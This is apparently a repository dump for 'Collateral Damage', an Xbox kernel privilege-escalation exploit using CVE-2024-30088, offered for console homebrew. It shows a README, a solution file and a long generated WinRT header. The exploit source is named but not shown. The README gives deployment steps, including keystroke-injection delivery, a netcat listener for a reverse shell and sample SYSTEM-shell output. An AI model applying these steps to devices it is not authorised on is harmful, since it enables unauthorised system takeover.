Project Path: arc_exploits-forsale_collateral-damage_firlq59e

Source Tree:

```txt
arc_exploits-forsale_collateral-damage_firlq59e
├── LICENSE
├── README.md
├── collat_payload
│   ├── Windows.Xbox.UI.Internal.ToastNotifications.h
│   ├── collat_payload.c
│   ├── collat_payload.vcxproj
│   ├── collat_payload.vcxproj.filters
│   ├── ioring.h
│   ├── ioring_lpe.c
│   ├── nt_offsets.c
│   ├── nt_offsets.h
│   ├── post_exploit.c
│   ├── post_exploit.h
│   ├── prefetch_asm.asm
│   ├── win_defs.h
│   ├── winrt.c
│   └── winrt.h
├── collat_payload.sln
├── ntdll.def
├── ntdll.exp
├── ntdll.lib
└── solstice_artifacts
    ├── gamescript_autosave.txt
    ├── gamescript_autosave_network.txt
    ├── payload_server_win_x64.exe
    └── stage2.bin

```

`LICENSE`:

```
MIT License

Copyright (c) 2024 Exploits.Forsale

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`README.md`:

```md
# Collateral Damage
Collateral Damage is a kernel exploit for Xbox SystemOS using [CVE-2024-30088](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088).
It targets Xbox One and Xbox Series consoles running kernel versions 25398.4478, 25398.4908, and 25398.4909. The initial entrypoint is via the Game Script UWP application.

The first stage payloads, PE loader and network loader are provided by [Solstice](https://github.com/exploits-forsale/solstice).

This exploit was developed by [Emma Kirkpatrick](https://x.com/carrot_c4k3) (vulnerability discovery & exploitation) and [Lander Brandt](https://x.com/landaire) (Solstice)

## Important Caveats

To place the payload locally on the Xbox console a full-trust explorer like [Adv File Explorer (FullTrust)](https://apps.microsoft.com/detail/9nbnjpsxfsqb) is recommended. Alternatively, the initial payload can be served via a USB keyboard simulator (rubber ducky etc.) and further payload stages can then be loaded over the network.

The reverse shell example provided here requires that your console is connected to a network. When connecting your console to a network be very careful to avoid connecting to the internet and updating. Try to block connectivity to Xbox LIVE as 
much as possible, at the very least by setting your DNS to invalid servers.

This exploit is not fully reliable. It relies on a CPU side channel as well as a race condition, both of which have the potential to fail. In the event of a failure, the exploit may alert you that it has failed via network output, or the console itself may crash and reboot.

## Usage

- Modify line 7 of `gamescript_autosave_network.txt` or `gamescript_autosave.txt` to contain the local IP of your PC.
  - For use with Full-Trust File Explorer App: Copy `gamescript_autosave.txt`, `stage2.bin`, and `run.exe` to the `LocalState` directory of the Game Script application on your Console (`Q:\Users\UserMgr0\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\`)
  - For HID / Keyboard simulator input: Type the contents of `gamescript_autosave_network.txt` into the GameScript window. Serve `stage2.bin` and `run.exe` via `payload_server_win_x64.exe --stage2 stage2.bin --run run.exe`
- Listen on port 7070 on your PC using netcat or a similar tool (command example: `nc64.exe -lvnp 7070`)
- Open the Game Script application on your console and select "Show Code Run window" and click "Run code once"
- If the exploit is success you should see output on your PC that resembles the following:
```
listening on [any] 7070 ...
connect to [192.168.0.61] from (UNKNOWN) [192.168.0.130] 49665
Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)
Build number: 25398.4478
Attempting to find kernel base...
Found likely kernel base: FFFFF80AF9800000
Attempting exploit...
Exploit succeeded! Running payload!

Microsoft Windows [Version 10.0.25398.4478]
Copyright (c) Microsoft Corporation. All rights reserved.

S:\>
```

## Experimentation
Lots of additional work is needed to bring this to the point of being a user-friendly tool for loading homebrew onto the Xbox, but I hope that this provides a good starting point :) If you would like to play around with running code as SYSTEM you can put your code in the `post_exploit` function in `post_exploit.c`.

## Further Work
There is lots more to do on this, but as the kernel part is done I wanted to share it with the community so developers could start poking around with SYSTEM privileges. Here are a few things that I am still hoping to add in the future:
- Side loading support
- Unsigned non-UWP process launching
- SSH support

Additional ideas are welcome :)

## Thanks
thank you to everyone who helped me brainstorm and shared their knowledge and time with me throughout this!!! some of those who i would like to show appreciation to:

- chompie
- tuxuser
- baw
- [Xbox One Research](https://xboxoneresearch.github.io/)
- XBOX-SCENE Discord
```

`collat_payload.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.9.34728.123
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "collat_payload", "collat_payload\collat_payload.vcxproj", "{C8172E40-5D40-417A-A6A4-E233C0D1AC12}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x64.ActiveCfg = Debug|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x64.Build.0 = Debug|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x86.ActiveCfg = Debug|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Debug|x86.Build.0 = Debug|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x64.ActiveCfg = Release|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x64.Build.0 = Release|x64
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x86.ActiveCfg = Release|Win32
		{C8172E40-5D40-417A-A6A4-E233C0D1AC12}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {787BF3D5-0C80-4BB2-9A46-47BE0999B6CD}
	EndGlobalSection
EndGlobal

```

`collat_payload/Windows.Xbox.UI.Internal.ToastNotifications.h`:

```h
/* Header file automatically generated from Windows.Xbox.UI.Internal.ToastNotifications.idl */
/*
 * File built with Microsoft(R) MIDLRT Compiler Engine Version 10.00.0231 
 */

#pragma warning( disable: 4049 )  /* more than 64k source lines */

/* verify that the <rpcndr.h> version is high enough to compile this file*/
#ifndef __REQUIRED_RPCNDR_H_VERSION__
#define __REQUIRED_RPCNDR_H_VERSION__ 500
#endif

/* verify that the <rpcsal.h> version is high enough to compile this file*/
#ifndef __REQUIRED_RPCSAL_H_VERSION__
#define __REQUIRED_RPCSAL_H_VERSION__ 100
#endif

#include <rpc.h>
#include <rpcndr.h>

#ifndef __RPCNDR_H_VERSION__
#error this stub requires an updated version of <rpcndr.h>
#endif /* __RPCNDR_H_VERSION__ */

#ifndef COM_NO_WINDOWS_H
#include <windows.h>
#include <ole2.h>
#endif /*COM_NO_WINDOWS_H*/
#ifndef __Windows2EXbox2EUI2EInternal2EToastNotifications_h__
#define __Windows2EXbox2EUI2EInternal2EToastNotifications_h__
#ifndef __Windows2EXbox2EUI2EInternal2EToastNotifications_p_h__
#define __Windows2EXbox2EUI2EInternal2EToastNotifications_p_h__


#pragma once

// Ensure that the setting of the /ns_prefix command line switch is consistent for all headers.
// If you get an error from the compiler indicating "warning C4005: 'CHECK_NS_PREFIX_STATE': macro redefinition", this
// indicates that you have included two different headers with different settings for the /ns_prefix MIDL command line switch
#if !defined(DISABLE_NS_PREFIX_CHECKS)
#define CHECK_NS_PREFIX_STATE "never"
#endif // !defined(DISABLE_NS_PREFIX_CHECKS)


#pragma push_macro("MIDL_CONST_ID")
#undef MIDL_CONST_ID
#define MIDL_CONST_ID const __declspec(selectany)


//  API Contract Inclusion Definitions
#if !defined(SPECIFIC_API_CONTRACT_DEFINITIONS)
#if !defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATEDEVENTSCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATEDEVENTSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATEDEVENTSCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATIONCAMERASETTINGSCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATIONCAMERASETTINGSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_ACTIVATIONCAMERASETTINGSCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_CONTACTACTIVATEDEVENTSCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_ACTIVATION_CONTACTACTIVATEDEVENTSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_CONTACTACTIVATEDEVENTSCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_WEBUISEARCHACTIVATEDEVENTSCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_ACTIVATION_WEBUISEARCHACTIVATEDEVENTSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_ACTIVATION_WEBUISEARCHACTIVATEDEVENTSCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_BACKGROUND_BACKGROUNDALARMAPPLICATIONCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_BACKGROUND_BACKGROUNDALARMAPPLICATIONCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_BACKGROUND_BACKGROUNDALARMAPPLICATIONCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_CALLS_BACKGROUND_CALLSBACKGROUNDCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_CALLS_BACKGROUND_CALLSBACKGROUNDCONTRACT_VERSION 0x40000
#endif // defined(WINDOWS_APPLICATIONMODEL_CALLS_BACKGROUND_CALLSBACKGROUNDCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_CALLS_CALLSPHONECONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_CALLS_CALLSPHONECONTRACT_VERSION 0x70000
#endif // defined(WINDOWS_APPLICATIONMODEL_CALLS_CALLSPHONECONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_CALLS_CALLSVOIPCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_CALLS_CALLSVOIPCONTRACT_VERSION 0x40000
#endif // defined(WINDOWS_APPLICATIONMODEL_CALLS_CALLSVOIPCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_CALLS_LOCKSCREENCALLCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_CALLS_LOCKSCREENCALLCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_CALLS_LOCKSCREENCALLCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_COMMUNICATIONBLOCKING_COMMUNICATIONBLOCKINGCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_COMMUNICATIONBLOCKING_COMMUNICATIONBLOCKINGCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_APPLICATIONMODEL_COMMUNICATIONBLOCKING_COMMUNICATIONBLOCKINGCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_FULLTRUSTAPPCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_FULLTRUSTAPPCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_APPLICATIONMODEL_FULLTRUSTAPPCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_SEARCH_SEARCHCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_SEARCH_SEARCHCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_APPLICATIONMODEL_SEARCH_SEARCHCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_STARTUPTASKCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_STARTUPTASKCONTRACT_VERSION 0x30000
#endif // defined(WINDOWS_APPLICATIONMODEL_STARTUPTASKCONTRACT_VERSION)

#if !defined(WINDOWS_APPLICATIONMODEL_WALLET_WALLETCONTRACT_VERSION)
#define WINDOWS_APPLICATIONMODEL_WALLET_WALLETCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_APPLICATIONMODEL_WALLET_WALLETCONTRACT_VERSION)

#if !defined(WINDOWS_DEVICES_PRINTERS_EXTENSIONS_EXTENSIONSCONTRACT_VERSION)
#define WINDOWS_DEVICES_PRINTERS_EXTENSIONS_EXTENSIONSCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_DEVICES_PRINTERS_EXTENSIONS_EXTENSIONSCONTRACT_VERSION)

#if !defined(WINDOWS_DEVICES_SMARTCARDS_SMARTCARDBACKGROUNDTRIGGERCONTRACT_VERSION)
#define WINDOWS_DEVICES_SMARTCARDS_SMARTCARDBACKGROUNDTRIGGERCONTRACT_VERSION 0x30000
#endif // defined(WINDOWS_DEVICES_SMARTCARDS_SMARTCARDBACKGROUNDTRIGGERCONTRACT_VERSION)

#if !defined(WINDOWS_DEVICES_SMARTCARDS_SMARTCARDEMULATORCONTRACT_VERSION)
#define WINDOWS_DEVICES_SMARTCARDS_SMARTCARDEMULATORCONTRACT_VERSION 0x60000
#endif // defined(WINDOWS_DEVICES_SMARTCARDS_SMARTCARDEMULATORCONTRACT_VERSION)

#if !defined(WINDOWS_DEVICES_SMS_LEGACYSMSAPICONTRACT_VERSION)
#define WINDOWS_DEVICES_SMS_LEGACYSMSAPICONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_DEVICES_SMS_LEGACYSMSAPICONTRACT_VERSION)

#if !defined(WINDOWS_FOUNDATION_FOUNDATIONCONTRACT_VERSION)
#define WINDOWS_FOUNDATION_FOUNDATIONCONTRACT_VERSION 0x40000
#endif // defined(WINDOWS_FOUNDATION_FOUNDATIONCONTRACT_VERSION)

#if !defined(WINDOWS_FOUNDATION_UNIVERSALAPICONTRACT_VERSION)
#define WINDOWS_FOUNDATION_UNIVERSALAPICONTRACT_VERSION 0xf0000
#endif // defined(WINDOWS_FOUNDATION_UNIVERSALAPICONTRACT_VERSION)

#if !defined(WINDOWS_GAMING_INPUT_GAMINGINPUTPREVIEWCONTRACT_VERSION)
#define WINDOWS_GAMING_INPUT_GAMINGINPUTPREVIEWCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_GAMING_INPUT_GAMINGINPUTPREVIEWCONTRACT_VERSION)

#if !defined(WINDOWS_GLOBALIZATION_GLOBALIZATIONJAPANESEPHONETICANALYZERCONTRACT_VERSION)
#define WINDOWS_GLOBALIZATION_GLOBALIZATIONJAPANESEPHONETICANALYZERCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_GLOBALIZATION_GLOBALIZATIONJAPANESEPHONETICANALYZERCONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_CAPTURE_APPBROADCASTCONTRACT_VERSION)
#define WINDOWS_MEDIA_CAPTURE_APPBROADCASTCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_MEDIA_CAPTURE_APPBROADCASTCONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_CAPTURE_APPCAPTURECONTRACT_VERSION)
#define WINDOWS_MEDIA_CAPTURE_APPCAPTURECONTRACT_VERSION 0x40000
#endif // defined(WINDOWS_MEDIA_CAPTURE_APPCAPTURECONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_CAPTURE_APPCAPTUREMETADATACONTRACT_VERSION)
#define WINDOWS_MEDIA_CAPTURE_APPCAPTUREMETADATACONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_CAPTURE_APPCAPTUREMETADATACONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_CAPTURE_CAMERACAPTUREUICONTRACT_VERSION)
#define WINDOWS_MEDIA_CAPTURE_CAMERACAPTUREUICONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_CAPTURE_CAMERACAPTUREUICONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_CAPTURE_GAMEBARCONTRACT_VERSION)
#define WINDOWS_MEDIA_CAPTURE_GAMEBARCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_CAPTURE_GAMEBARCONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_DEVICES_CALLCONTROLCONTRACT_VERSION)
#define WINDOWS_MEDIA_DEVICES_CALLCONTROLCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_DEVICES_CALLCONTROLCONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_MEDIACONTROLCONTRACT_VERSION)
#define WINDOWS_MEDIA_MEDIACONTROLCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_MEDIACONTROLCONTRACT_VERSION)

#if !defined(WINDOWS_MEDIA_PROTECTION_PROTECTIONRENEWALCONTRACT_VERSION)
#define WINDOWS_MEDIA_PROTECTION_PROTECTIONRENEWALCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_MEDIA_PROTECTION_PROTECTIONRENEWALCONTRACT_VERSION)

#if !defined(WINDOWS_NETWORKING_CONNECTIVITY_WWANCONTRACT_VERSION)
#define WINDOWS_NETWORKING_CONNECTIVITY_WWANCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_NETWORKING_CONNECTIVITY_WWANCONTRACT_VERSION)

#if !defined(WINDOWS_NETWORKING_SOCKETS_CONTROLCHANNELTRIGGERCONTRACT_VERSION)
#define WINDOWS_NETWORKING_SOCKETS_CONTROLCHANNELTRIGGERCONTRACT_VERSION 0x30000
#endif // defined(WINDOWS_NETWORKING_SOCKETS_CONTROLCHANNELTRIGGERCONTRACT_VERSION)

#if !defined(WINDOWS_PHONE_PHONECONTRACT_VERSION)
#define WINDOWS_PHONE_PHONECONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_PHONE_PHONECONTRACT_VERSION)

#if !defined(WINDOWS_PHONE_PHONEINTERNALCONTRACT_VERSION)
#define WINDOWS_PHONE_PHONEINTERNALCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_PHONE_PHONEINTERNALCONTRACT_VERSION)

#if !defined(WINDOWS_SECURITY_ENTERPRISEDATA_ENTERPRISEDATACONTRACT_VERSION)
#define WINDOWS_SECURITY_ENTERPRISEDATA_ENTERPRISEDATACONTRACT_VERSION 0x50000
#endif // defined(WINDOWS_SECURITY_ENTERPRISEDATA_ENTERPRISEDATACONTRACT_VERSION)

#if !defined(WINDOWS_STORAGE_PROVIDER_CLOUDFILESCONTRACT_VERSION)
#define WINDOWS_STORAGE_PROVIDER_CLOUDFILESCONTRACT_VERSION 0x70000
#endif // defined(WINDOWS_STORAGE_PROVIDER_CLOUDFILESCONTRACT_VERSION)

#if !defined(WINDOWS_SYSTEM_SYSTEMMANAGEMENTCONTRACT_VERSION)
#define WINDOWS_SYSTEM_SYSTEMMANAGEMENTCONTRACT_VERSION 0x70000
#endif // defined(WINDOWS_SYSTEM_SYSTEMMANAGEMENTCONTRACT_VERSION)

#if !defined(WINDOWS_UI_CORE_COREWINDOWDIALOGSCONTRACT_VERSION)
#define WINDOWS_UI_CORE_COREWINDOWDIALOGSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_UI_CORE_COREWINDOWDIALOGSCONTRACT_VERSION)

#if !defined(WINDOWS_UI_VIEWMANAGEMENT_VIEWMANAGEMENTVIEWSCALINGCONTRACT_VERSION)
#define WINDOWS_UI_VIEWMANAGEMENT_VIEWMANAGEMENTVIEWSCALINGCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_UI_VIEWMANAGEMENT_VIEWMANAGEMENTVIEWSCALINGCONTRACT_VERSION)

#if !defined(WINDOWS_UI_WEBUI_CORE_WEBUICOMMANDBARCONTRACT_VERSION)
#define WINDOWS_UI_WEBUI_CORE_WEBUICOMMANDBARCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_UI_WEBUI_CORE_WEBUICOMMANDBARCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_CONTENTENUMERATIONCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_CONTENTENUMERATIONCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_CONTENTENUMERATIONCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_DATACACHECLIENTCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_DATACACHECLIENTCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_DATACACHECLIENTCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_DATACACHECONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_DATACACHECONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_DATACACHECONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_DEPLOYMENTCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_DEPLOYMENTCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_DEPLOYMENTCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_ERRORCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_ERRORCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_ERRORCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_HELPCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_HELPCONTRACT_VERSION 0x20000
#endif // defined(WINDOWS_XBOX_SHELL_HELPCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_MULTIPLAYERCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_MULTIPLAYERCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_MULTIPLAYERCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_ONESTORESERVICESCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_ONESTORESERVICESCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_ONESTORESERVICESCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_PARENTALCONTROLSCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_PARENTALCONTROLSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_PARENTALCONTROLSCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_SETTINGSCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_SETTINGSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_SETTINGSCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_SHARINGCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_SHARINGCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_SHARINGCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_STORECONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_STORECONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_STORECONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_SYSTEMUICONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_SYSTEMUICONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_SYSTEMUICONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_TOASTNOTIFICATIONSCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_UICONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_UICONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_UICONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SHELL_WNFCONTRACT_VERSION)
#define WINDOWS_XBOX_SHELL_WNFCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SHELL_WNFCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SYSTEM_CONSOLE2CONTRACT_VERSION)
#define WINDOWS_XBOX_SYSTEM_CONSOLE2CONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SYSTEM_CONSOLE2CONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SYSTEM_LAUNCHERCONTRACT_VERSION)
#define WINDOWS_XBOX_SYSTEM_LAUNCHERCONTRACT_VERSION 0x10000
#endif // defined(WINDOWS_XBOX_SYSTEM_LAUNCHERCONTRACT_VERSION)

#if !defined(WINDOWS_XBOX_SYSTEM_LEGACYUSERCONTRACT_VERSION)
#define WINDOWS_XBOX_SYSTEM_LEGACYUSERCONTRACT_VERSION 0x50000
#endif // defined(WINDOWS_XBOX_SYSTEM_LEGACYUSERCONTRACT_VERSION)

#endif // defined(SPECIFIC_API_CONTRACT_DEFINITIONS)


// Header files for imported files
#include "inspectable.h"
#include "AsyncInfo.h"
#include "EventToken.h"
#include "windowscontracts.h"
#include "Windows.Foundation.h"
#include "Windows.Data.Xml.Dom.h"
#include "Windows.Storage.Streams.h"
//#include "Windows.System.Xbox.h"
//#include "Windows.Xbox.Input.h"
//#include "Windows.Xbox.Shell.h"
// Importing Collections header
#include <windows.foundation.collections.h>

#if defined(__cplusplus) && !defined(CINTERFACE)
/* Forward Declarations */
#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IActiveToastChangedHandler;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler Windows::Xbox::UI::Internal::ToastNotifications::IActiveToastChangedHandler

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIActiveToastChangedHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastActionHandler;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler Windows::Xbox::UI::Internal::ToastNotifications::IToastActionHandler

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastActionHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IToastExpiredHandler;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler Windows::Xbox::UI::Internal::ToastNotifications::IToastExpiredHandler

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastExpiredHandler_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IEditQuickRow;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow Windows::Xbox::UI::Internal::ToastNotifications::IEditQuickRow

#endif // ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIEditQuickRow_FWD_DEFINED__

#ifndef ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__
#define ____x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction_FWD_DEFINED__

namespace Windows {
    namespace Xbox {
        namespace UI {
            namespace Internal {
                namespace ToastNotifications {
                    interface IInboxAction;
                } /* ToastNotifications */
            } /* Internal */
        } /* UI */
    } /* Xbox */
} /* Windows */
#define __x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIInboxAction Windows::Xbox::UI::Internal::ToastNotifications::IInboxAction

